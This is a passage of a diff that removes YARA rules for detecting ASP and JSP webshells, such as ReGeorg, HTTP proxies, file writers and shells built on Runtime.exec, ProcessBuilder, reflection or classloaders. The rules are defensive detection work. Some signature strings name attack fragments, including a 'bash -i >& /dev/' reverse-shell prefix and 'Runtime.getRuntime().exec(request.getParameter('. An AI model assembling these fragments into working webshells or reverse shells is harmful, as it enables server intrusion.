-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-    condition:
-        filesize < 10KB and (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and (
-            any of ( $asp_input* ) or
-        (
-            $asp_xml_http and
-            any of ( $asp_xml_method* )
-        ) or
-        (
-            any of ( $asp_form* ) and
-            any of ( $asp_text* ) and
-            $asp_asp
-        )
-        )
-        and 6 of ( $scan* ) and any of ( $sus* )
-}
-
-rule WEBSHELL_JSP_ReGeorg
-{
-    meta:
-        description = "Webshell regeorg JSP version"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        reference = "https://github.com/sensepost/reGeorg"
-        hash = "6db49e43722080b5cd5f07e058a073ba5248b584"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        date = "2021/01/24"
-        modified = "2024-12-09"
-        score = 75
-        hash = "650eaa21f4031d7da591ebb68e9fc5ce5c860689"
-        hash = "00c86bf6ce026ccfaac955840d18391fbff5c933"
-        hash = "6db49e43722080b5cd5f07e058a073ba5248b584"
-        hash = "9108a33058aa9a2fb6118b719c5b1318f33f0989"
-
-        id = "cbb90005-d8f8-5c64-85d1-29e466f48c25"
-    strings:
-        $jgeorg1 = "request" fullword wide ascii
-        $jgeorg2 = "getHeader" fullword wide ascii
-        $jgeorg3 = "X-CMD" fullword wide ascii
-        $jgeorg4 = "X-STATUS" fullword wide ascii
-        $jgeorg5 = "socket" fullword wide ascii
-        $jgeorg6 = "FORWARD" fullword wide ascii
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-    condition:
-        filesize < 300KB and (
-        $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        and all of ( $jgeorg* )
-}
-
-rule WEBSHELL_JSP_HTTP_Proxy
-{
-    meta:
-        description = "Webshell JSP HTTP proxy"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        hash = "2f9b647660923c5262636a5344e2665512a947a4"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/24"
-        modified = "2024-12-09"
-        hash = "97c1e2bf7e769d3fc94ae2fc74ac895f669102c6"
-        hash = "2f9b647660923c5262636a5344e2665512a947a4"
-
-        id = "55be246e-30a8-52ed-bc5f-507e63bbfe16"
-    strings:
-        $jh1 = "OutputStream" fullword wide ascii
-        $jh2 = "InputStream"  wide ascii
-        $jh3 = "BufferedReader" fullword wide ascii
-        $jh4 = "HttpRequest" fullword wide ascii
-        $jh5 = "openConnection" fullword wide ascii
-        $jh6 = "getParameter" fullword wide ascii
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-    condition:
-        filesize < 10KB and (
-        $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        and all of ( $jh* )
-}
-
-rule WEBSHELL_JSP_Writer_Nano
-{
-    meta:
-        description = "JSP file writer"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/24"
-        modified = "2024-12-09"
-        hash = "ac91e5b9b9dcd373eaa9360a51aa661481ab9429"
-        hash = "c718c885b5d6e29161ee8ea0acadb6e53c556513"
-        hash = "9f1df0249a6a491cdd5df598d83307338daa4c43"
-        hash = "5e241d9d3a045d3ade7b6ff6af6c57b149fa356e"
-
-        id = "422a18f2-d6d4-5b42-be15-1eafe44e01cf"
-    strings:
-        // writting file to disk
-        $payload1 = ".write" wide ascii
-        $payload2 = "getBytes" fullword wide ascii
-        $payload3 = ".decodeBuffer" wide ascii
-        $payload4 = "FileOutputStream" fullword wide ascii
-
-        // writting using java logging, e.g 9f1df0249a6a491cdd5df598d83307338daa4c43
-        $logger1 = "getLogger" fullword ascii wide
-        $logger2 = "FileHandler" fullword ascii wide
-        $logger3 = "addHandler" fullword ascii wide
-
-        //strings from private rule capa_jsp_input
-        // request.getParameter
-        $input1 = "getParameter" fullword ascii wide
-        // request.getHeaders
-        $input2 = "getHeaders" fullword ascii wide
-        $input3 = "getInputStream" fullword ascii wide
-        $input4 = "getReader" fullword ascii wide
-        $req1 = "request" fullword ascii wide
-        $req2 = "HttpServletRequest" fullword ascii wide
-        $req3 = "getRequest" fullword ascii wide
-
-        $jw_sus1 = /getParameter\("."\)/ ascii wide // one char param
-        $jw_sus4 = "yoco" fullword ascii wide // webshell coder
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-    condition:
-        //any of them or
-        (
-            any of ( $input* ) and
-            any of ( $req* )
-        ) and (
-            filesize < 200 or
-            (
-                filesize < 1000 and
-                any of ( $jw_sus* )
-            )
-        )
-        and (
-        $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        and (
-            2 of ( $payload* ) or
-            all of ( $logger* )
-            )
-}
-
-rule EXT_WEBSHELL_JSP_Generic_Tiny
-{
-    meta:
-        description = "Generic JSP webshell tiny"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2024-12-16"
-        hash = "8fd343db0442136e693e745d7af1018a99b042af"
-        hash = "87c3ac9b75a72187e8bc6c61f50659435dbdc4fde6ed720cebb93881ba5989d8"
-        hash = "1aa6af726137bf261849c05d18d0a630d95530588832aadd5101af28acc034b5"
-
-        id = "fad14524-de44-52ea-95e6-3e5de3138926"
-    strings:
-        $payload1 = "ProcessBuilder" fullword wide ascii
-        $payload2 = "URLClassLoader" fullword wide ascii
-        // Runtime.getRuntime().exec(
-        $payload_rt1 = "Runtime" fullword wide ascii
-        $payload_rt2 = "getRuntime" fullword wide ascii
-        $payload_rt3 = "exec" fullword wide ascii
-
-        $jg_sus1 = "xe /c" ascii wide // of cmd.exe /c
-        $jg_sus2 = /getParameter\("."\)/ ascii wide // one char param
-        $jg_sus3 = "</pre>" ascii wide // webshells like fixed font wide
-        $jg_sus4 = "BASE64Decoder" fullword ascii wide
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-        //strings from private rule capa_jsp_input
-        // request.getParameter
-        $input1 = "getParameter" fullword ascii wide
-        // request.getHeaders
-        $input2 = "getHeaders" fullword ascii wide
-        $input3 = "getInputStream" fullword ascii wide
-        $input4 = "getReader" fullword ascii wide
-        $req1 = "request" fullword ascii wide
-        $req2 = "HttpServletRequest" fullword ascii wide
-        $req3 = "getRequest" fullword ascii wide
-
-        // no web input but fixed command to create reverse shell
-        $fixed_cmd1 = "bash -i >& /dev/" ascii wide
-
-        $fp1 = "Find Security Bugs is a plugin that aims to help security audit.</Details>"
-    condition:
-        //any of them or
-        (
-            (
-                filesize < 1000 and
-                any of ( $jg_sus* )
-            ) or
-            filesize < 250
-        ) and (
-            $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        and (
-                (
-                    any of ( $input* ) and
-                    any of ( $req* )
-                ) or (
-                    any of ( $fixed_cmd* )
-                )
-        )
-        and
-        ( 1 of ( $payload* ) or all of ( $payload_rt* ) )
-        and not any of ( $fp* )
-}
-
-rule WEBSHELL_JSP_Generic
-{
-    meta:
-        description = "Generic JSP webshell"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2024-12-09"
-        hash = "4762f36ca01fb9cda2ab559623d2206f401fc0b1"
-        hash = "bdaf9279b3d9e07e955d0ce706d9c42e4bdf9aa1"
-        hash = "ee9408eb923f2d16f606a5aaac7e16b009797a07"
-
-        id = "7535ade8-fc65-5558-a72c-cc14c3306390"
-    strings:
-        $susp0 = "cmd" fullword nocase ascii wide
-        $susp1 = "command" fullword nocase ascii wide
-        $susp2 = "shell" fullword nocase ascii wide
-        $susp3 = "download" fullword nocase ascii wide
-        $susp4 = "upload" fullword nocase ascii wide
-        $susp5 = "Execute" fullword nocase ascii wide
-        $susp6 = "\"pwd\"" ascii wide
-        $susp7 = "\"</pre>" ascii wide
-        $susp8 = /\\u00\d\d\\u00\d\d\\u00\d\d\\u00\d\d/ ascii wide
-        $susp9 = "*/\\u00" ascii wide // perfect match of 2 obfuscation methods: /**/\u00xx :)
-
-        $fp1 = "command = \"cmd.exe /c set\";"
-
-        //strings from private rule capa_bin_files
-        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
-        $pack  = { 50 41 43 4b 00 00 00 02 00 }
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-        //strings from private rule capa_jsp_input
-        // request.getParameter
-        $input1 = "getParameter" fullword ascii wide
-        // request.getHeaders
-        $input2 = "getHeaders" fullword ascii wide
-        $input3 = "getInputStream" fullword ascii wide
-        $input4 = "getReader" fullword ascii wide
-        $req1 = "request" fullword ascii wide
-        $req2 = "HttpServletRequest" fullword ascii wide
-        $req3 = "getRequest" fullword ascii wide
-
-        //strings from private rule capa_jsp_payload
-        $payload1 = "ProcessBuilder" fullword ascii wide
-        $payload2 = "processCmd" fullword ascii wide
-        // Runtime.getRuntime().exec(
-        $rt_payload1 = "Runtime" fullword ascii wide
-        $rt_payload2 = "getRuntime" fullword ascii wide
-        $rt_payload3 = "exec" fullword ascii wide
-
-    condition:
-        filesize < 300KB and not (
-        uint16(0) == 0x5a4d or
-        $dex at 0 or
-        $pack at 0 or
-        // fp on jar with zero compression
-        uint16(0) == 0x4b50
-        )
-        and (
-        $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        and (
-            any of ( $input* ) and
-            any of ( $req* )
-        )
-        and (
-        1 of ( $payload* ) or
-        all of ( $rt_payload* )
-        )
-        and not any of ( $fp* ) and any of ( $susp* )
-}
-
-rule WEBSHELL_JSP_Generic_Base64
-{
-    meta:
-        description = "Generic JSP webshell with base64 encoded payload"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/24"
-        modified = "2024-12-09"
-        hash = "8b5fe53f8833df3657ae2eeafb4fd101c05f0db0"
-        hash = "1b916afdd415dfa4e77cecf47321fd676ba2184d"
-
-        id = "2eabbad2-7d10-573a-9120-b9b763fa2352"
-    strings:
-        // Runtime
-        $one1 = "SdW50aW1l" wide ascii
-        $one2 = "J1bnRpbW" wide ascii
-        $one3 = "UnVudGltZ" wide ascii
-        $one4 = "IAdQBuAHQAaQBtAGUA" wide ascii
-        $one5 = "SAHUAbgB0AGkAbQBlA" wide ascii
-        $one6 = "UgB1AG4AdABpAG0AZQ" wide ascii
-        // exec
-        $two1 = "leGVj" wide ascii
-        $two2 = "V4ZW" wide ascii
-        $two3 = "ZXhlY" wide ascii
-        $two4 = "UAeABlAGMA" wide ascii
-        $two5 = "lAHgAZQBjA" wide ascii
-        $two6 = "ZQB4AGUAYw" wide ascii
-        // ScriptEngineFactory
-        $three1 = "TY3JpcHRFbmdpbmVGYWN0b3J5" wide ascii
-        $three2 = "NjcmlwdEVuZ2luZUZhY3Rvcn" wide ascii
-        $three3 = "U2NyaXB0RW5naW5lRmFjdG9ye" wide ascii
-        $three4 = "MAYwByAGkAcAB0AEUAbgBnAGkAbgBlAEYAYQBjAHQAbwByAHkA" wide ascii
-        $three5 = "TAGMAcgBpAHAAdABFAG4AZwBpAG4AZQBGAGEAYwB0AG8AcgB5A" wide ascii
-        $three6 = "UwBjAHIAaQBwAHQARQBuAGcAaQBuAGUARgBhAGMAdABvAHIAeQ" wide ascii
-
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-        //strings from private rule capa_bin_files
-        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
-        $pack  = { 50 41 43 4b 00 00 00 02 00 }
-
-    condition:
-        (
-        $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        and not (
-        uint16(0) == 0x5a4d or
-        $dex at 0 or
-        $pack at 0 or
-        // fp on jar with zero compression
-        uint16(0) == 0x4b50
-        )
-        and filesize < 300KB and
-        ( any of ( $one* ) and any of ( $two* ) or any of ( $three* ) )
-}
-
-rule WEBSHELL_JSP_Generic_ProcessBuilder
-{
-    meta:
-        description = "Generic JSP webshell which uses processbuilder to execute user input"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2023-04-05"
-        hash = "82198670ac2072cd5c2853d59dcd0f8dfcc28923"
-        hash = "c05a520d96e4ebf9eb5c73fc0fa446ceb5caf343"
-        hash = "347a55c174ee39ec912d9107e971d740f3208d53af43ea480f502d177106bbe8"
-        hash = "d0ba29b646274e8cda5be1b940a38d248880d9e2bba11d994d4392c80d6b65bd"
-
-        id = "2a7c5f44-24a1-5f43-996e-945c209b79b1"
-    strings:
-        $exec = "ProcessBuilder" fullword wide ascii
-        $start = "start" fullword wide ascii
-
-        //strings from private rule capa_jsp_input
-        // request.getParameter
-        $input1 = "getParameter" fullword ascii wide
-        // request.getHeaders
-        $input2 = "getHeaders" fullword ascii wide
-        $input3 = "getInputStream" fullword ascii wide
-        $input4 = "getReader" fullword ascii wide
-        $req1 = "request" fullword ascii wide
-        $req2 = "HttpServletRequest" fullword ascii wide
-        $req3 = "getRequest" fullword ascii wide
-
-    condition:
-        filesize < 2000 and (
-            any of ( $input* ) and
-            any of ( $req* )
-        )
-        and $exec and $start
-}
-
-rule WEBSHELL_JSP_Generic_Reflection
-{
-    meta:
-        description = "Generic JSP webshell which uses reflection to execute user input"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2024-12-09"
-        hash = "62e6c6065b5ca45819c1fc049518c81d7d165744"
-        hash = "bf0ff88cbb72c719a291c722ae3115b91748d5c4920afe7a00a0d921d562e188"
-
-        id = "806ffc8b-1dc8-5e28-ae94-12ad3fee18cd"
-    strings:
-        $ws_exec = "invoke" fullword wide ascii
-        $ws_class = "Class" fullword wide ascii
-        $fp1 = "SOAPConnection"
-        $fp2 = "/CORBA/"
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-        //strings from private rule capa_jsp_input
-        // request.getParameter
-        $input1 = "getParameter" fullword ascii wide
-        // request.getHeaders
-        $input2 = "getHeaders" fullword ascii wide
-        $input3 = "getInputStream" fullword ascii wide
-        $input4 = "getReader" fullword ascii wide
-        $req1 = "request" fullword ascii wide
-        $req2 = "HttpServletRequest" fullword ascii wide
-        $req3 = "getRequest" fullword ascii wide
-
-        $cj_encoded1 = "\"java.util.Base64$Decoder\"" ascii wide
-    condition:
-        //any of them or
-        all of ( $ws_* ) and (
-        $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        and not any of ( $fp* ) and
-        (
-            // either some kind of code input from the a web request ...
-            filesize < 10KB and
-            (
-                any of ( $input* ) and
-                any of ( $req* )
-            )
-            or
-            (
-                // ... or some encoded payload (which might get code input from a web request)
-                filesize < 30KB and
-                any of ( $cj_encoded* ) and
-                // base64 :
-                // ignore first and last 500bytes because they usually contain code for decoding and executing
-                math.entropy(500, filesize-500) >= 5.5 and
-                // encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
-                math.mean(500, filesize-500) > 80 and
-                // deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
-                // lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
-                // 89 is the mean of the base64 chars
-                math.deviation(500, filesize-500, 89.0) < 23
-            )
-        )
-
-}
-
-rule WEBSHELL_JSP_Generic_Classloader
-{
-    meta:
-        description = "Generic JSP webshell which uses classloader to execute user input"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        hash = "6b546e78cc7821b63192bb8e087c133e8702a377d17baaeb64b13f0dd61e2347"
-        date = "2021/01/07"
-        modified = "2024-12-09"
-        hash = "f3a7e28e1c38fa5d37811bdda1d6b0893ab876023d3bd696747a35c04141dcf0"
-        hash = "8ea2a25344e6094fa82dfc097bbec5f1675f6058f2b7560deb4390bcbce5a0e7"
-        hash = "b9ea1e9f91c70160ee29151aa35f23c236d220c72709b2b75123e6fa1da5c86c"
-        hash = "80211c97f5b5cd6c3ab23ae51003fd73409d273727ba502d052f6c2bd07046d6"
-        hash = "8e544a5f0c242d1f7be503e045738369405d39731fcd553a38b568e0889af1f2"
-
-        id = "037e6b24-9faf-569b-bb52-dbe671ab2e87"
-    strings:
-        $exec = "extends ClassLoader" wide ascii
-        $class = "defineClass" fullword wide ascii
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-        //strings from private rule capa_jsp_input
-        // request.getParameter
-        $input1 = "getParameter" fullword ascii wide
-        // request.getHeaders
-        $input2 = "getHeaders" fullword ascii wide
-        $input3 = "getInputStream" fullword ascii wide
-        $input4 = "getReader" fullword ascii wide
-        $req1 = "request" fullword ascii wide
-        $req2 = "HttpServletRequest" fullword ascii wide
-        $req3 = "getRequest" fullword ascii wide
-
-    condition:
-        //any of them or
-        (
-            (
-                $cjsp_short1 at 0 or
-                    any of ( $cjsp_long* ) or
-                    ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-                (
-                    $cjsp_short2 and (
-                        $cjsp_short1 in ( 0..1000 ) or
-                        $cjsp_short1 in ( filesize-1000..filesize )
-                    )
-                )
-            )
-            and (
-                any of ( $input* ) and
-                any of ( $req* )
-            )
-            and $exec and $class
-        ) and
-        (
-            filesize < 10KB or
-            (
-                filesize < 50KB and
-                (
-                    // filled with same characters
-                    math.entropy(500, filesize-500) <= 1 or
-                    // filled with random garbage
-                    math.entropy(500, filesize-500) >= 7.7
-                )
-            )
-        )
-}
-
-rule WEBSHELL_JSP_NetSpy
-{
-    meta:
-        description = "JSP netspy webshell"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/24"
-        modified = "2024-12-09"
-        hash = "94d1aaabde8ff9b4b8f394dc68caebf981c86587"
-        hash = "3870b31f26975a7cb424eab6521fc9bffc2af580"
-
-        id = "41f5c171-878d-579f-811d-91d74f7e3e24"
-    strings:
-        $scan1 = "scan" nocase wide ascii
-        $scan2 = "port" nocase wide ascii
-        $scan3 = "web" fullword nocase wide ascii
-        $scan4 = "proxy" fullword nocase wide ascii
-        $scan5 = "http" fullword nocase wide ascii
-        $scan6 = "https" fullword nocase wide ascii
-        $write1 = "os.write" fullword wide ascii
-        $write2 = "FileOutputStream" fullword wide ascii
-        $write3 = "PrintWriter" fullword wide ascii
-        $http = "java.net.HttpURLConnection" fullword wide ascii
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-        //strings from private rule capa_jsp_input
-        // request.getParameter
-        $input1 = "getParameter" fullword ascii wide
-        // request.getHeaders
-        $input2 = "getHeaders" fullword ascii wide
-        $input3 = "getInputStream" fullword ascii wide
-        $input4 = "getReader" fullword ascii wide
-        $req1 = "request" fullword ascii wide
-        $req2 = "HttpServletRequest" fullword ascii wide
-        $req3 = "getRequest" fullword ascii wide
-
-    condition:
-        filesize < 30KB and (
-        $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        and (
-            any of ( $input* ) and
-            any of ( $req* )
-        )
-        and 4 of ( $scan* ) and 1 of ( $write* ) and $http
-}
-
-rule WEBSHELL_JSP_By_String
-{
-    meta:
-        description = "JSP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/09"
-        modified = "2024-12-09"
-        hash = "e9060aa2caf96be49e3b6f490d08b8a996c4b084"
-        hash = "4c2464503237beba54f66f4a099e7e75028707aa"
-        hash = "06b42d4707e7326aff402ecbb585884863c6351a"
-        hash = "dada47c052ec7fcf11d5cfb25693bc300d3df87de182a254f9b66c7c2c63bf2e"
-        hash = "f9f6c696c1f90df6421cd9878a1dec51a62e91b4b4f7eac4920399cb39bc3139"
-        hash = "f1d8360dc92544cce301949e23aad6eb49049bacf9b7f54c24f89f7f02d214bb"
-        hash = "1d1f26b1925a9d0caca3fdd8116629bbcf69f37f751a532b7096a1e37f4f0076"
-        hash = "850f998753fde301d7c688b4eca784a045130039512cf51292fcb678187c560b"
-
-        id = "8d64e40b-5583-5887-afe1-b926d9880913"
-    strings:
-        $jstring1 = "<title>Boot Shell</title>" wide ascii
-        $jstring2 = "String oraPWD=\"" wide ascii
-        $jstring3 = "Owned by Chinese Hackers!" wide ascii
-        $jstring4 = "AntSword JSP" wide ascii
-        $jstring5 = "JSP Webshell</" wide ascii
-        $jstring6 = "motoME722remind2012" wide ascii
-        $jstring7 = "EC(getFromBase64(toStringHex(request.getParameter(\"password" wide ascii
-        $jstring8 = "http://jmmm.com/web/index.jsp" wide ascii
-        $jstring9 = "list.jsp = Directory & File View" wide ascii
-        $jstring10 = "jdbcRowSet.setDataSourceName(request.getParameter(" wide ascii
-        $jstring11 = "Mr.Un1k0d3r RingZer0 Team" wide ascii
-        $jstring12 = "MiniWebCmdShell" fullword wide ascii
-        $jstring13 = "pwnshell.jsp" fullword wide ascii
-        $jstring14 = "session set &lt;key&gt; &lt;value&gt; [class]<br>"  wide ascii
-        $jstring15 = "Runtime.getRuntime().exec(request.getParameter(" nocase wide ascii
-        $jstring16 = "GIF98a<%@page" wide ascii
-        $jstring17 = "Tas9er" fullword wide ascii
-        $jstring18 = "uu0028\\u" wide ascii //obfuscated /
-        $jstring19 = "uu0065\\u" wide ascii //obfuscated e
-        $jstring20 = "uu0073\\u" wide ascii //obfuscated s
